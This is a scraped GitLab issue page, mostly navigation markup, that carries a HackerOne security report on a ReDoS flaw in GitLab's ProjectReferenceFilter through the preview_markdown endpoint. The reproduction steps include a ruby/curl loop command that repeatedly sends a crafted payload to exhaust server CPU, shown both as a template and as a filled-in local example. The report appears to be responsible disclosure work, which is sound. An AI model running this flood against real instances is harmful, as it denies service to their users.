registry&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/ml/models&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;operations_menu&quot;,&quot;title&quot;:&quot;Operate&quot;,&quot;icon&quot;:&quot;cloud-pod&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/environments&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;environments&quot;,&quot;title&quot;:&quot;Environments&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/environments&quot;,&quot;link_classes&quot;:&quot;shortcuts-environments&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;infrastructure_registry&quot;,&quot;title&quot;:&quot;Terraform modules&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/terraform_module_registry&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;monitor_menu&quot;,&quot;title&quot;:&quot;Monitor&quot;,&quot;icon&quot;:&quot;monitor&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/incidents&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;incidents&quot;,&quot;title&quot;:&quot;Incidents&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/incidents&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;service_desk&quot;,&quot;title&quot;:&quot;Service Desk&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/issues/service_desk&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;analyze_menu&quot;,&quot;title&quot;:&quot;Analyze&quot;,&quot;icon&quot;:&quot;chart&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/value_stream_analytics&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;cycle_analytics&quot;,&quot;title&quot;:&quot;Value stream analytics&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/value_stream_analytics&quot;,&quot;link_classes&quot;:&quot;shortcuts-project-cycle-analytics&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;contributors&quot;,&quot;title&quot;:&quot;Contributor analytics&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/graphs/master?ref_type=heads&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;ci_cd_analytics&quot;,&quot;title&quot;:&quot;CI/CD analytics&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/pipelines/charts&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;repository_analytics&quot;,&quot;title&quot;:&quot;Repository analytics&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/graphs/master/charts&quot;,&quot;link_classes&quot;:&quot;shortcuts-repository-charts&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;code_review&quot;,&quot;title&quot;:&quot;Code review analytics&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/analytics/code_reviews&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;issues&quot;,&quot;title&quot;:&quot;Issue analytics&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/analytics/issues_analytics&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;insights&quot;,&quot;title&quot;:&quot;Insights&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/insights/&quot;,&quot;link_classes&quot;:&quot;shortcuts-project-insights&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;model_experiments&quot;,&quot;title&quot;:&quot;Model experiments&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/ml/experiments&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false}],&quot;current_context_header&quot;:&quot;Project&quot;,&quot;support_path&quot;:&quot;https://about.gitlab.com/get-help/&quot;,&quot;docs_path&quot;:&quot;/help/docs&quot;,&quot;display_whats_new&quot;:true,&quot;show_version_check&quot;:null,&quot;search&quot;:{&quot;search_path&quot;:&quot;/search&quot;,&quot;issues_path&quot;:&quot;/dashboard/issues&quot;,&quot;mr_path&quot;:&quot;/dashboard/merge_requests&quot;,&quot;autocomplete_path&quot;:&quot;/search/autocomplete&quot;,&quot;settings_path&quot;:&quot;/search/settings&quot;,&quot;search_context&quot;:{&quot;group&quot;:{&quot;id&quot;:9970,&quot;name&quot;:&quot;GitLab.org&quot;,&quot;full_name&quot;:&quot;GitLab.org&quot;},&quot;group_metadata&quot;:{&quot;issues_path&quot;:&quot;/groups/gitlab-org/-/issues&quot;,&quot;mr_path&quot;:&quot;/groups/gitlab-org/-/merge_requests&quot;},&quot;project&quot;:{&quot;id&quot;:278964,&quot;name&quot;:&quot;GitLab&quot;},&quot;project_metadata&quot;:{&quot;mr_path&quot;:&quot;/gitlab-org/gitlab/-/merge_requests&quot;,&quot;issues_path&quot;:&quot;/gitlab-org/gitlab/-/issues&quot;},&quot;code_search&quot;:false,&quot;scope&quot;:&quot;issues&quot;,&quot;for_snippets&quot;:null}},&quot;panel_type&quot;:&quot;project&quot;,&quot;shortcut_links&quot;:[{&quot;title&quot;:&quot;Snippets&quot;,&quot;href&quot;:&quot;/explore/snippets&quot;,&quot;css_class&quot;:&quot;dashboard-shortcuts-snippets&quot;},{&quot;title&quot;:&quot;Groups&quot;,&quot;href&quot;:&quot;/explore/groups&quot;,&quot;css_class&quot;:&quot;dashboard-shortcuts-groups&quot;},{&quot;title&quot;:&quot;Projects&quot;,&quot;href&quot;:&quot;/explore/projects/starred&quot;,&quot;css_class&quot;:&quot;dashboard-shortcuts-projects&quot;}],&quot;terms&quot;:&quot;/-/users/terms&quot;}"></aside>

<div class="content-wrapper">
<div class="broadcast-wrapper">




</div>
<div class="alert-wrapper alert-wrapper-top-space gl-flex gl-flex-col gl-gap-3 container-fluid container-limited">






























</div>
<div class="top-bar-fixed container-fluid" data-testid="top-bar">
<div class="top-bar-container gl-flex gl-items-center gl-gap-2">
<div class="gl-grow gl-basis-0 gl-flex gl-items-center gl-justify-start">
<button class="gl-button btn btn-icon btn-md btn-default btn-default-tertiary js-super-sidebar-toggle-expand super-sidebar-toggle -gl-ml-3" aria-controls="super-sidebar" aria-expanded="false" aria-label="Primary navigation sidebar" type="button"><svg class="s16 gl-icon gl-button-icon " data-testid="sidebar-icon"><use href="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg#sidebar"></use></svg>

</button>
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"GitLab.org","item":"https://gitlab.com/gitlab-org"},{"@type":"ListItem","position":2,"name":"GitLab","item":"https://gitlab.com/gitlab-org/gitlab"},{"@type":"ListItem","position":3,"name":"Issues","item":"https://gitlab.com/gitlab-org/gitlab/-/issues"},{"@type":"ListItem","position":4,"name":"#416225","item":"https://gitlab.com/gitlab-org/gitlab/-/issues/416225"}]}


</script>
<div data-testid="breadcrumb-links" id="js-vue-page-breadcrumbs-wrapper">
<div data-breadcrumbs-json="[{&quot;text&quot;:&quot;GitLab.org&quot;,&quot;href&quot;:&quot;/gitlab-org&quot;,&quot;avatarPath&quot;:&quot;/uploads/-/system/group/avatar/9970/project_avatar.png&quot;},{&quot;text&quot;:&quot;GitLab&quot;,&quot;href&quot;:&quot;/gitlab-org/gitlab&quot;,&quot;avatarPath&quot;:&quot;/uploads/-/system/project/avatar/278964/project_avatar.png&quot;},{&quot;text&quot;:&quot;Issues&quot;,&quot;href&quot;:&quot;/gitlab-org/gitlab/-/issues&quot;,&quot;avatarPath&quot;:null},{&quot;text&quot;:&quot;#416225&quot;,&quot;href&quot;:&quot;/gitlab-org/gitlab/-/issues/416225&quot;,&quot;avatarPath&quot;:null}]" id="js-vue-page-breadcrumbs"></div>
<div id="js-injected-page-breadcrumbs"></div>
</div>


</div>
<div class="gl-flex-none gl-flex gl-items-center gl-justify-center">
<div id="js-advanced-search-modal"></div>

</div>
<div class="gl-grow gl-basis-0 gl-flex gl-items-center gl-justify-end">
<div id="js-work-item-feedback"></div>


</div>
</div>
</div>

<div class="container-fluid container-limited limit-container-width project-highlight-puc">
<main class="content" id="content-body" itemscope itemtype="http://schema.org/SoftwareSourceCode">
<div class="flash-container flash-container-page sticky" data-testid="flash-container">
<div id="js-global-alerts"></div>
</div>







<div class="issue-details issuable-details js-issue-details">
<div class="detail-page-description content-block js-detail-page-description gl-pt-3 gl-pb-0 gl-border-none">
<div data-header-actions-data="{&quot;can_create_issue&quot;:&quot;true&quot;,&quot;can_create_incident&quot;:&quot;false&quot;,&quot;can_destroy_issue&quot;:&quot;false&quot;,&quot;can_reopen_issue&quot;:&quot;false&quot;,&quot;can_report_spam&quot;:&quot;&quot;,&quot;can_update_issue&quot;:&quot;false&quot;,&quot;is_issue_author&quot;:&quot;false&quot;,&quot;issue_path&quot;:&quot;/gitlab-org/gitlab/-/issues/416225&quot;,&quot;new_issue_path&quot;:&quot;/gitlab-org/gitlab/-/issues/new?add_related_issue=416225&quot;,&quot;project_path&quot;:&quot;gitlab-org/gitlab&quot;,&quot;report_abuse_path&quot;:&quot;/-/abuse_reports/add_category&quot;,&quot;reported_user_id&quot;:2741139,&quot;reported_from_url&quot;:&quot;https://gitlab.com/gitlab-org/gitlab/-/issues/416225&quot;,&quot;submit_as_spam_path&quot;:&quot;/gitlab-org/gitlab/-/issues/416225/mark_as_spam&quot;,&quot;issuable_email_address&quot;:null,&quot;can_promote_to_epic&quot;:&quot;false&quot;}" data-initial="{&quot;endpoint&quot;:&quot;/gitlab-org/gitlab/-/issues/416225&quot;,&quot;updateEndpoint&quot;:&quot;/gitlab-org/gitlab/-/issues/416225.json&quot;,&quot;canUpdate&quot;:false,&quot;canDestroy&quot;:false,&quot;issuableRef&quot;:&quot;#416225&quot;,&quot;imported&quot;:false,&quot;markdownPreviewPath&quot;:&quot;/gitlab-org/gitlab/-/preview_markdown?target_id=416225\u0026target_type=Issue&quot;,&quot;markdownDocsPath&quot;:&quot;/help/user/markdown.md&quot;,&quot;lockVersion&quot;:0,&quot;issuableTemplateNamesPath&quot;:&quot;/gitlab-org/gitlab/description_templates/names/issue&quot;,&quot;initialTitleHtml&quot;:&quot;ReDoS via ProjectReferenceFilter in any Markdown fields&quot;,&quot;initialTitleText&quot;:&quot;ReDoS via ProjectReferenceFilter in any Markdown fields&quot;,&quot;initialDescriptionHtml&quot;:&quot;\u003cp data-sourcepos=\&quot;1:1-1:247\&quot; dir=\&quot;auto\&quot;\u003e\u003cgl-emoji title=\&quot;warning sign\&quot; data-name=\&quot;warning\&quot; data-unicode-version=\&quot;4.0\&quot;\u003e⚠\u003c/gl-emoji\u003e \u003cstrong data-sourcepos=\&quot;1:11-1:247\&quot;\u003ePlease read \u003ca data-sourcepos=\&quot;1:25-1:125\&quot; href=\&quot;https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md\&quot;\u003ethe process\u003c/a\u003e on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.\u003c/strong\u003e\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;3:1-3:99\&quot; dir=\&quot;auto\&quot;\u003e\u003cstrong data-sourcepos=\&quot;3:1-3:70\&quot;\u003e\u003ca data-sourcepos=\&quot;3:3-3:68\&quot; href=\&quot;https://hackerone.com/reports/1963255\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003eHackerOne report #1963255\u003c/a\u003e\u003c/strong\u003e by \u003ccode data-sourcepos=\&quot;3:76-3:83\&quot;\u003eryhmnlfj\u003c/code\u003e on 2023-04-27:\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;5:1-5:87\&quot; dir=\&quot;auto\&quot;\u003e\u003ca data-sourcepos=\&quot;5:1-5:17\&quot; href=\&quot;#report\&quot;\u003eReport\u003c/a\u003e | \u003ca data-sourcepos=\&quot;5:21-5:47\&quot; href=\&quot;#attachments\&quot;\u003eAttachments\u003c/a\u003e | \u003ca data-sourcepos=\&quot;5:51-5:87\&quot; href=\&quot;#how-to-reproduce\&quot;\u003eHow To Reproduce\u003c/a\u003e\u003c/p\u003e\u0026#x000A;\u003ch2 data-sourcepos=\&quot;7:1-7:9\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-report\&quot; class=\&quot;anchor\&quot; href=\&quot;#report\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eReport\u003c/h2\u003e\u0026#x000A;\u003ch4 data-sourcepos=\&quot;9:1-9:13\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-summary\&quot; class=\&quot;anchor\&quot; href=\&quot;#summary\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eSummary\u003c/h4\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;11:1-12:159\&quot; dir=\&quot;auto\&quot;\u003eI found the server-side ReDoS via \u003ccode data-sourcepos=\&quot;11:36-11:57\&quot;\u003eProjectReferenceFilter\u003c/code\u003e in any Markdown fields.\u003cbr data-sourcepos=\&quot;11:85-11:85\&quot;\u003e\u0026#x000A;An attacker can take down the GitLab instance by sending the \u003cstrong data-sourcepos=\&quot;12:62-12:89\&quot;\u003eunauthenticated requests\u003c/strong\u003e which contain the crafted payload to the \u003ccode data-sourcepos=\&quot;12:133-12:148\&quot;\u003epreview_markdown\u003c/code\u003e endpoint.\u003c/p\u003e\u0026#x000A;\u003ch4 data-sourcepos=\&quot;14:1-14:44\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-preparation-before-reproducing-the-bug\&quot; class=\&quot;anchor\&quot; href=\&quot;#preparation-before-reproducing-the-bug\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003ePreparation before reproducing the bug\u003c/h4\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;16:1-18:66\&quot; dir=\&quot;auto\&quot;\u003ePlease install the command line tools \u003ccode data-sourcepos=\&quot;16:40-16:43\&quot;\u003eruby\u003c/code\u003e and \u003ccode data-sourcepos=\&quot;16:51-16:54\&quot;\u003ecurl\u003c/code\u003e on your computer.\u003cbr data-sourcepos=\&quot;16:76-16:76\&quot;\u003e\u0026#x000A;Also, please download \u003ccode data-sourcepos=\&quot;17:24-17:64\&quot;\u003eProjectReferenceFilter_ReDoS_payload.json\u003c/code\u003e attached to this report.\u003cbr data-sourcepos=\&quot;17:93-17:93\&quot;\u003e\u0026#x000A;These will be used in step 11 of the \&quot;Steps to reproduce\&quot; section.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;20:1-21:84\&quot; dir=\&quot;auto\&quot;\u003eAnd most importantly, please prepare a GitLab instance that you can use personally.\u003cbr data-sourcepos=\&quot;20:86-20:86\&quot;\u003e\u0026#x000A;\u003cstrong data-sourcepos=\&quot;21:1-21:84\&quot;\u003eDO NOT try to reproduce this bug against \u003ccode data-sourcepos=\&quot;21:45-21:54\&quot;\u003egitlab.com\u003c/code\u003e or other public instances.\u003c/strong\u003e\u003c/p\u003e\u0026#x000A;\u003ch4 data-sourcepos=\&quot;23:1-23:24\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-steps-to-reproduce\&quot; class=\&quot;anchor\&quot; href=\&quot;#steps-to-reproduce\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eSteps to reproduce\u003c/h4\u003e\u0026#x000A;\u003col data-sourcepos=\&quot;25:1-29:0\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;25:1-25:76\&quot;\u003eSet up and launch your GitLab instance, and create a new account on it.\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;26:1-26:50\&quot;\u003eSign in to the account you created in step 1.\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;27:1-29:0\&quot;\u003eCreate a new \u003cstrong data-sourcepos=\&quot;27:17-27:32\&quot;\u003epublic group\u003c/strong\u003e and make a note of \u003cstrong data-sourcepos=\&quot;27:53-27:77\&quot;\u003ethe public group name\u003c/strong\u003e at this time.\u003cbr data-sourcepos=\&quot;27:94-27:94\&quot;\u003e\u0026#x000A;At the same time, make a note of \u003cstrong data-sourcepos=\&quot;28:37-28:64\&quot;\u003ethe base URL with scheme\u003c/strong\u003e shown in \&quot;Group URL\&quot;.\u003c/li\u003e\u0026#x000A;\u003c/ol\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;30:1-30:132\&quot; dir=\&quot;auto\&quot;\u003e\u003ca class=\&quot;no-attachment-icon\&quot; href=\&quot;https://user-content.gitlab-static.net/b75147f8ef878dfa20ac2f5e55f8b17cd3cb54c4/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f34633639333532312d336136652d343162612d623133352d6566333965363565633561392f6372656174655f7075626c69635f67726f75705f757064617465642e706e67\&quot; target=\&quot;_blank\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; data-canonical-src=\&quot;https://h1.sec.gitlab.net/a/4c693521-3a6e-41ba-b135-ef39e65ec5a9/create_public_group_updated.png\&quot;\u003e\u003cimg data-sourcepos=\&quot;30:1-30:132\&quot; src=\&quot;data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==\&quot; alt=\&quot;create_public_group_updated.png\&quot; data-canonical-src=\&quot;https://h1.sec.gitlab.net/a/4c693521-3a6e-41ba-b135-ef39e65ec5a9/create_public_group_updated.png\&quot; decoding=\&quot;async\&quot; class=\&quot;lazy\&quot; data-src=\&quot;https://user-content.gitlab-static.net/b75147f8ef878dfa20ac2f5e55f8b17cd3cb54c4/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f34633639333532312d336136652d343162612d623133352d6566333965363565633561392f6372656174655f7075626c69635f67726f75705f757064617465642e706e67\&quot;\u003e\u003c/a\u003e\u003c/p\u003e\u0026#x000A;\u003col data-sourcepos=\&quot;32:1-35:0\&quot; start=\&quot;4\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;32:1-32:89\&quot;\u003eSign out as you will be accessing as an unauthenticated user in the following steps.\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;33:1-33:133\&quot;\u003eAfter launching your browser&#39;s developer tools, browse to the \u003cstrong data-sourcepos=\&quot;33:66-33:81\&quot;\u003epublic group\u003c/strong\u003e you created in step 3 as an unauthenticated user.\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;34:1-35:0\&quot;\u003eCheck the HTML rendered in step 5 and take a note of the content of \u003ccode data-sourcepos=\&quot;34:73-34:82\&quot;\u003ecsrf-token\u003c/code\u003e at this time.\u003c/li\u003e\u0026#x000A;\u003c/ol\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;36:1-36:98\&quot; dir=\&quot;auto\&quot;\u003e\u003ca class=\&quot;no-attachment-icon\&quot; href=\&quot;https://user-content.gitlab-static.net/2615aa289fca96f983b8f600e0e128f5ddb8c28e/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f37373738303031652d383532612d346137642d613030312d3262616137336331633861652f637372665f746f6b656e2e706e67\&quot; target=\&quot;_blank\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; data-canonical-src=\&quot;https://h1.sec.gitlab.net/a/7778001e-852a-4a7d-a001-2baa73c1c8ae/csrf_token.png\&quot;\u003e\u003cimg data-sourcepos=\&quot;36:1-36:98\&quot; src=\&quot;data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==\&quot; alt=\&quot;csrf_token.png\&quot; data-canonical-src=\&quot;https://h1.sec.gitlab.net/a/7778001e-852a-4a7d-a001-2baa73c1c8ae/csrf_token.png\&quot; decoding=\&quot;async\&quot; class=\&quot;lazy\&quot; data-src=\&quot;https://user-content.gitlab-static.net/2615aa289fca96f983b8f600e0e128f5ddb8c28e/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f37373738303031652d383532612d346137642d613030312d3262616137336331633861652f637372665f746f6b656e2e706e67\&quot;\u003e\u003c/a\u003e\u003c/p\u003e\u0026#x000A;\u003col data-sourcepos=\&quot;38:1-39:0\&quot; start=\&quot;7\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;38:1-39:0\&quot;\u003eCheck the request sent to your GitLab instance in step 5 and take a note the value of \u003ccode data-sourcepos=\&quot;38:91-38:105\&quot;\u003e_gitlab_session\u003c/code\u003e at this time.\u003c/li\u003e\u0026#x000A;\u003c/ol\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;40:1-40:104\&quot; dir=\&quot;auto\&quot;\u003e\u003ca class=\&quot;no-attachment-icon\&quot; href=\&quot;https://user-content.gitlab-static.net/90b6d161551dfaa71299865e08e0650f5f9ba20c/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f32373838353066642d386630322d346431392d616436372d6536313033653663333837662f73657373696f6e5f76616c75652e706e67\&quot; target=\&quot;_blank\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; data-canonical-src=\&quot;https://h1.sec.gitlab.net/a/278850fd-8f02-4d19-ad67-e6103e6c387f/session_value.png\&quot;\u003e\u003cimg data-sourcepos=\&quot;40:1-40:104\&quot; src=\&quot;data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==\&quot; alt=\&quot;session_value.png\&quot; data-canonical-src=\&quot;https://h1.sec.gitlab.net/a/278850fd-8f02-4d19-ad67-e6103e6c387f/session_value.png\&quot; decoding=\&quot;async\&quot; class=\&quot;lazy\&quot; data-src=\&quot;https://user-content.gitlab-static.net/90b6d161551dfaa71299865e08e0650f5f9ba20c/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f32373838353066642d386630322d346431392d616436372d6536313033653663333837662f73657373696f6e5f76616c75652e706e67\&quot;\u003e\u003c/a\u003e\u003c/p\u003e\u0026#x000A;\u003col data-sourcepos=\&quot;42:1-44:0\&quot; start=\&quot;8\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;42:1-42:51\&quot;\u003eClose your browser and open a command console.\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;43:1-44:0\&quot;\u003eLet&#39;s construct the command to demonstrate the ReDoS. Replace each string in the command template according to the replacement table.\u003c/li\u003e\u0026#x000A;\u003c/ol\u003e\u0026#x000A;\u003cul data-sourcepos=\&quot;45:1-45:21\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;45:1-45:21\&quot;\u003eCommand template:\u003c/li\u003e\u0026#x000A;\u003c/ul\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;46:1-48:5\&quot; class=\&quot;code highlight js-syntax-highlight language-plaintext\&quot; lang=\&quot;plaintext\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eruby -e &#39;while true do p spawn(\&quot;curl --header Content-Type:application/json --header X-CSRF-Token:[CSRF_TOKEN_VALUE] --header Cookie:_gitlab_session=[SESSION_VALUE] --data [@]ProjectReferenceFilter_ReDoS_payload.json [BASE_URL_WITH_SCHEME]groups/[PUBLIC_GROUP_NAME]/preview_markdown\&quot;); sleep 1; end&#39;  \u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003cul data-sourcepos=\&quot;49:1-50:0\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;49:1-50:0\&quot;\u003eReplacement table:\u003c/li\u003e\u0026#x000A;\u003c/ul\u003e\u0026#x000A;\u003ctable data-sourcepos=\&quot;51:1-56:84\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cthead\u003e\u0026#x000A;\u003ctr data-sourcepos=\&quot;51:1-51:86\&quot;\u003e\u0026#x000A;\u003cth data-sourcepos=\&quot;51:2-51:34\&quot;\u003eString in the command template\u003c/th\u003e\u0026#x000A;\u003cth data-sourcepos=\&quot;51:36-51:83\&quot;\u003eReplace with\u003c/th\u003e\u0026#x000A;\u003c/tr\u003e\u0026#x000A;\u003c/thead\u003e\u0026#x000A;\u003ctbody\u003e\u0026#x000A;\u003ctr data-sourcepos=\&quot;53:1-53:86\&quot;\u003e\u0026#x000A;\u003ctd data-sourcepos=\&quot;53:2-53:34\&quot;\u003e\u003ccode data-sourcepos=\&quot;53:4-53:21\&quot;\u003e[CSRF_TOKEN_VALUE]\u003c/code\u003e\u003c/td\u003e\u0026#x000A;\u003ctd data-sourcepos=\&quot;53:36-53:83\&quot;\u003ethe content of \u003ccode data-sourcepos=\&quot;53:53-53:62\&quot;\u003ecsrf-token\u003c/code\u003e noted in step 6\u003c/td\u003e\u0026#x000A;\u003c/tr\u003e\u0026#x000A;\u003ctr data-sourcepos=\&quot;54:1-54:86\&quot;\u003e\u0026#x000A;\u003ctd data-sourcepos=\&quot;54:2-54:34\&quot;\u003e\u003ccode data-sourcepos=\&quot;54:4-54:18\&quot;\u003e[SESSION_VALUE]\u003c/code\u003e\u003c/td\u003e\u0026#x000A;\u003ctd data-sourcepos=\&quot;54:36-54:83\&quot;\u003ethe value of \u003ccode data-sourcepos=\&quot;54:51-54:65\&quot;\u003e_gitlab_session\u003c/code\u003e noted in step 7\u003c/td\u003e\u0026#x000A;\u003c/tr\u003e\u0026#x000A;\u003ctr data-sourcepos=\&quot;55:1-55:86\&quot;\u003e\u0026#x000A;\u003ctd data-sourcepos=\&quot;55:2-55:34\&quot;\u003e\u003ccode data-sourcepos=\&quot;55:4-55:25\&quot;\u003e[BASE_URL_WITH_SCHEME]\u003c/code\u003e\u003c/td\u003e\u0026#x000A;\u003ctd data-sourcepos=\&quot;55:36-55:83\&quot;\u003e\u0026#x000A;\u003cstrong data-sourcepos=\&quot;55:37-55:64\&quot;\u003ethe base URL with scheme\u003c/strong\u003e noted in step 3\u003c/td\u003e\u0026#x000A;\u003c/tr\u003e\u0026#x000A;\u003ctr data-sourcepos=\&quot;56:1-56:84\&quot;\u003e\u0026#x000A;\u003ctd data-sourcepos=\&quot;56:2-56:34\&quot;\u003e\u003ccode data-sourcepos=\&quot;56:4-56:22\&quot;\u003e[PUBLIC_GROUP_NAME]\u003c/code\u003e\u003c/td\u003e\u0026#x000A;\u003ctd data-sourcepos=\&quot;56:36-56:83\&quot;\u003e\u0026#x000A;\u003cstrong data-sourcepos=\&quot;56:37-56:61\&quot;\u003ethe public group name\u003c/strong\u003e noted in step 3\u003c/td\u003e\u0026#x000A;\u003c/tr\u003e\u0026#x000A;\u003c/tbody\u003e\u0026#x000A;\u003c/table\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;58:1-58:59\&quot; dir=\&quot;auto\&quot;\u003eFor reference, here&#39;s an example in my local environment:\u003c/p\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;59:1-61:3\&quot; class=\&quot;code highlight js-syntax-highlight language-plaintext\&quot; lang=\&quot;plaintext\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eruby -e &#39;while true do p spawn(\&quot;curl --header Content-Type:application/json --header X-CSRF-Token:E_NhtPEqA7IpGGSH0jgsfRtruz5fAeeqRxQgBn-kl2mCkdxxBHP4HC9YdK6_mDdZqxCkhzkjSzESZOvAGwJQPQ --header Cookie:_gitlab_session=26c454aeadefc013a10a0fdddabcfd12 --data [@]ProjectReferenceFilter_ReDoS_payload.json http://my-gitlab-h1.test/groups/public_group_for_test/preview_markdown\&quot;); sleep 1; end&#39;  \u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003col data-sourcepos=\&quot;63:1-66:0\&quot; start=\&quot;10\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;63:1-63:134\&quot;\u003eChange the current directory of the command console to the directory where \u003ccode data-sourcepos=\&quot;63:81-63:121\&quot;\u003eProjectReferenceFilter_ReDoS_payload.json\u003c/code\u003e is saved.\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;64:1-66:0\&quot;\u003eRun the command constructed in step 9 in the command console, and confirm the significant consumption of CPU resource.\u003cbr data-sourcepos=\&quot;64:125-64:125\&quot;\u003e\u0026#x000A;For reference, when I ran the above command, the CPU resource of my instance with 16 CPU cores and 32GB of memory was quickly exhausted.\u003c/li\u003e\u0026#x000A;\u003c/ol\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;67:1-67:126\&quot; dir=\&quot;auto\&quot;\u003e\u003ca class=\&quot;no-attachment-icon\&quot; 